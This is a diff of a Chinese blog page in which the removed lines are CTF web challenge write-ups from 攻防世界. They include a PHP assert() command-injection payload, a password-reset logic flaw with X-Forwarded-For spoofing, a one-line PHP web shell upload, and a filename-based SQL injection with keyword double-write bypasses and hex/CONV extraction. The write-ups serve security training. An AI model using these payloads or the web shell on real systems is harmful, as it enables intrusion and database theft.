-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>assert为断言函数，会将括号内的表达式当做函数去执行，当返回结果为<code>True</code>时，就不会执行<code>die函数</code>。题目直接下载源码无法看到flag，但是<code>flag.php</code>存在必定要利用，所以这里通过<code>assert()函数</code>来执行<code>cat命令</code>，去查看<code>flag.php</code></p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=what_ever&apos;) or system(&apos;cat templates/flag.php&apos;) //</span><br></pre></td></tr></table></figure>
-<p>闭合掉前面的<code>(&#39;</code>就可以，不管前面函数的执行结果，加了<code>or</code>保证让<code>assert()函数</code>执行的结果为<code>True</code></p>
-<p>请求后返回空白，右键查看源代码，就看到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-3.png" alt="4-3"></p>
-<p>参考文章：<a href="https://www.jianshu.com/p/795f918d791b" target="_blank" rel="noopener">https://www.jianshu.com/p/795f918d791b</a></p>
-<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>题目进去之后看到如下提示</p>
-<blockquote>
-<p>In this little training challenge, you are going to learn about the <a href="http://en.wikipedia.org/wiki/Robots_exclusion_standard" target="_blank" rel="noopener">Robots_exclusion_standard</a>.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p>
-<p> Enjoy!  </p>
-</blockquote>
-<p>访问<code>robots.txt</code>，内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
-<p>访问<code>fl0g.php</code>，直接拿到flag</p>
-<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>进入题目，可选动作有<code>login</code>、<code>Register</code>、<code>Findpwd</code></p>
-<p>第一时间想到的是<code>Findwd</code>功能可能会有漏洞，先注册用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-1.png" alt="6-1"></p>
-<p>拿着刚注册的用户去重置密码，抓包查看参数。注意到其中有<code>step</code>参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-2.png" alt="6-2"></p>
-<p>然后就直接一个提交新密码的框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-3.png" alt="6-3"></p>
-<p>提交新密码，抓包查看。提交用户名和新密码账号，直接就修改成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-4.png" alt="6-4"></p>
-<p>有戏，将用户名换成<code>admin</code>，同样修改成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-5.png" alt="6-5"></p>
-<p>用 admin 登录，进入界面，其他按钮都可以点击唯独点击<code>Manage</code>会提示：<code>IP Not allowed</code>，试着添加<code>X-Forwarded-For: 127.0.0.1</code>，进入成功</p>
-<p>没有flag，但是有了提示</p>
-<blockquote>
-<p>Where Is The Flag?</p>
-<p>index.php?module=filemanage&amp;do=???</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-6.png" alt="6-6"></p>
-<p>尝试了一些常见的系统命令无果，仔细看提示里的<code>filemanage</code>，试一下<code>upload</code>，出现了可以上传的页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?module=filemanage&amp;do=upload</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-7.png" alt="6-7"></p>
-<p>上传<code>php</code>提示：<code>It is a php</code>。上传文件后缀名为<code>png</code>，抓包修改为<code>php</code>还是出现同样提示。在文件内容前加上<code>GIF89a</code>还是同样提示</p>
-<p>修改后缀名为<code>php5</code>，修改文件内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;system($_GET[&apos;pass&apos;]);&lt;script&gt;</span><br></pre></td></tr></table></figure>
-<p>上传成功，拿下flag</p>
-<blockquote>
-<p>所以本题应该是采用 黑名单 + 检测文件内容&lt;?php 的方式</p>
-</blockquote>
-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>进入题目后需要先注册，然后拿着注册的用户去登录，进入到上传页面。刚开始尝试了<code>php</code>、<code>png</code>、<code>gif</code>都提示：<code>Incorrect file extension!</code>，最后发现只有<code>jpg</code>后缀可以上传，上传成功之后，会显示我们上传的所有文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png" alt="7-1"></p>
-<p>没有思路，看了别人的WriteUp才知道是<code>文件名注入</code></p>
-<p>我们上传文件，页面将我们上传的文件名返回，应该是查询了数据库。首先验证对参数的拼接，上传三个文件名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&quot; or 1=1 --+.jpg</span><br><span class="line">s&apos; or 1=1 --+.jpg</span><br><span class="line">s or 1=1 --+.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png" alt="7-2"></p>
-<p>其中只有带<code>单引号</code>的没有返回，说明发生了构造，查询结果出乎服务器的预料。确认是单引号之后，就可以开始测试注语句</p>
-<blockquote>
-<p>测试的时候发现，必须要用 加号（+） 连接前后，如下：</p>
-<p>s’+(要执行的语句)+’</p>
-<p>除了要执行的语句以外，前后两部分是为了闭合单引号，也必须要用 加号 连接，否则语句会出错，导致无法回显内容</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(select database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png" alt="7-3"></p>
-<p><code>select</code>被过滤掉了，尝试双写绕过成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seselectlect database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png" alt="7-4"></p>
-<p>但是会发现返回的结果为<code>0</code>，后来发现<code>select database()</code>的结果被系统设置为0</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png" alt="7-5"></p>
-<p>执行常规注入表名的语句返回结果也是0，并且发现<code>from</code>也被过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p>怀疑是否对返回的结果进行过滤（即检测为英文字母就过滤掉并返回0），所以尝试将返回结果进行转换</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png" alt="7-6"></p>
-<p>果然将结果处理为十六进制就能返回，将<code>十六进制转换为ASCII</code>，得到<code>web</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;7765625&quot;</span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">ascii_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,len(s),2):</span><br><span class="line">	if(len(s[i:i+2])==2):</span><br><span class="line">		hex_list.append(s[i:i+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出web</span><br></pre></td></tr></table></figure>
-<p>得到数据库名称之后，注表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p>成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了</p>
-<p>试着将结果在转换为十进制（使用CONV()函数）</p>
-<blockquote>
-<p>CONV()函数用法：</p>
-<p>CONV(要转换的字符串，要转换的进制，转换后的进制)</p>
-</blockquote>
-<p>还是继续拿注数据库的语句进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(hex(database()),16,10))+&apos;.jpg</span><br></pre></td></tr></table></figure>
-<p>发现返回一个科学计数法的数字</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png" alt="7-7"></p>
-<p>想了一下，觉得是因为<code>数据库名</code>转换为<code>十六进制</code>对应的是两位两位（比如 web -&gt; 77 65 62），而CONV函数将十六进制整串转化为<code>十进制</code>，那这个数就非常大并且只能用科学技术法标识。想到了一个解决办法：<code>将十六进制的内容分段传给CONV函数能以十进制正常返回的范围</code>，这时候就需要借用到<code>substr()</code>函数，后来尝试最大只能是<code>12</code>位，开始注入：</p>
-<p><strong>注数据库</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 131277325825392</span><br></pre></td></tr></table></figure>
-<p>果然回显成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png" alt="7-8"></p>
-<p>第二部分（返回没有第一次长，应该是结束了）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 1819238756</span><br></pre></td></tr></table></figure>
-<p>将两次返回的结果分别转换为ASCII</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = [131277325825392,1819238756]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出 web_upload</span><br></pre></td></tr></table></figure>
-<p><strong>注表名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112602976187180</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 114784820031327</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112615676665705</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 126853610566245</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 48848364724837</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 29299</span><br></pre></td></tr></table></figure>
-<p>转换为 ASCII</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(flag)		#输出 files,hello_flag_is_here,members</span><br></pre></td></tr></table></figure>
-<p><strong>注列名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 115858377367398</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 7102823</span><br></pre></td></tr></table></figure>
-<p>使用如上代码，转换为 ASCII 结果为 <code>i_am_flag</code></p>
-<p><strong>注数据</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 36427215695199</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 92806431727430</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 560750951</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png" alt="7-9"></p>
-<p>浏览器结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png" alt="7-10"></p>
-<p>转换为 ASCII 结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png" alt="7-11"></p>
-<p>拿到flag，直接提交不用加外套</p>
-<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>
+        <h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>进入题目后给</p>
+
       
 
       
@@ -473,7 +227,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -487,18 +241,9 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/09/17/DC1-DC4靶机渗透测试/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          DC-1至DC-4靶机渗透测试
-        
-      </div>
-    </a>
   
-  
-    <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Linux系统下搭建Web服务器和FTP服务器</div>
+    <a href="/Knlvre.github-io/2019/10/19/CVE-2016-5159 复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2016-5159 复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -624,15 +369,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
